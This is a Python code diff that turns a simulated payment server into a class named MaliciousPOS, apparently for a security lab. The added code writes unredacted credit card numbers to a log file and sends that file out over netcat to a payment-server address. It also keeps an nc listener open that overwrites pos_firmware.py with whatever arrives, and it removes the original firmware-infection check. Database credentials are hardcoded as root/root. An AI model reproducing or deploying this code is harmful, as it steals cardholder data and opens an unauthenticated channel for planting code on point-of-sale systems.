@@ -7,51 +7,39 @@ import time
 import sys
 import thread
 import traceback
+import subprocess
 
 
-class PaymentServer:
-
+class MaliciousPOS:
     def __init__(self):
         # Open database connection
-        host = "localhost"
+        self.payment_server_ip = "localhost"  # private ip address of payment server: 10.0.0.20
+        self.payment_server_port = "6666"
         user = "root"
         passwd = "root"
         db_name = "payment_db"
-        self.db = MySQLdb.connect(host, user, passwd, db_name)
-
-        # prepare a cursor object using cursor() method
+        self.db = MySQLdb.connect(self.payment_server_ip, user, passwd, db_name)
         self.cursor = self.db.cursor()
-        self.is_infected = False
-
-    def check_firmware(self):
-        print "firmware check is running..."
-        while True:
-            with open("pos_firmware", "r") as firmware:
-                if "malicious" in firmware.readline():
-                    self.is_infected = True
-                    print "(malicious firmware)"
-                else:
-                    print "(normal firmware)"
-                    self.is_infected = False
-            time.sleep(3)
+        self.port = "5555"
 
     @staticmethod
     def redact_info(credit_card_no):
         return '*' * 12 + credit_card_no[12:]
 
     def run(self):
-        print "server running..."
-
-        # start another thread to periodically check pos_firmware
-        thread.start_new_thread(self.check_firmware, ())
+        print "malicious POS firmware running..."
 
         while True:
+            # keep opening nc listening port to receive firmware update
+            with open("pos_firmware.py", "w") as firmware:
+                subprocess.Popen(["nc", "-l", "-p", str(self.port)], stdout=firmware, stderr=subprocess.PIPE)
+
             transac_id = ''.join(random.choice(string.digits) for _ in range(8))
             datetime = time.strftime('%Y-%m-%d %H:%M:%S')
             content = ''.join(random.choice(string.ascii_letters) for _ in range(8))
             amount = random.uniform(1, 10000)
             credit_card_no = ''.join(random.choice(string.digits) for _ in range(16))
-            rd_credit_card_no = PaymentServer.redact_info(credit_card_no)
+            rd_credit_card_no = MaliciousPOS.redact_info(credit_card_no)
 
             sql = "INSERT INTO transactions(transac_id, \
                      datetime, content, amount, credit_card_no) \
@@ -67,18 +55,19 @@ class PaymentServer:
                 print "one record inserted."
             except Exception as e:
                 traceback.print_exc(e)
-                # print(e)
                 # Rollback in case there is any error
                 self.db.rollback()
 
-            # store unredacted data in some sort of log file if infected
-            if self.is_infected:
-                with open("log_file", "a") as log_file:
-                    unredacted_info = ("(transac_id, datetime, content, amount, credit_card_no) = "
-                                       "('%s','%s', '%s', '%.2f', '%s')\n" %
-                                       (transac_id, datetime, content, amount, credit_card_no))
-                    log_file.write(unredacted_info)
-                    log_file.close()
+            with open("log_file", "w") as log_file:
+                unredacted_info = ("(transac_id, datetime, content, amount, credit_card_no) = "
+                                   "('%s','%s', '%s', '%.2f', '%s')\n" %
+                                   (transac_id, datetime, content, amount, credit_card_no))
+                log_file.write(unredacted_info)
+                log_file.close()
+
+            # transfer the content of local log file to server
+            nc_call = "nc " + self.payment_server_ip + " " + self.payment_server_port + " < " + "log_file"
+            subprocess.Popen(nc_call, shell=True)
 
             # assume interval is drawn from exp distribution
             interval = random.expovariate(0.1)
@@ -87,13 +76,13 @@ class PaymentServer:
 
 
 if __name__ == '__main__':
-    server = PaymentServer()
+    client = MaliciousPOS()
     try:
-        server.run()
+        client.run()
     finally:
         # disconnect from server
-        print "server shutdown."
-        server.db.close()
+        print "client shutdown."
+        client.db.close()
 
     sys.exit()
 
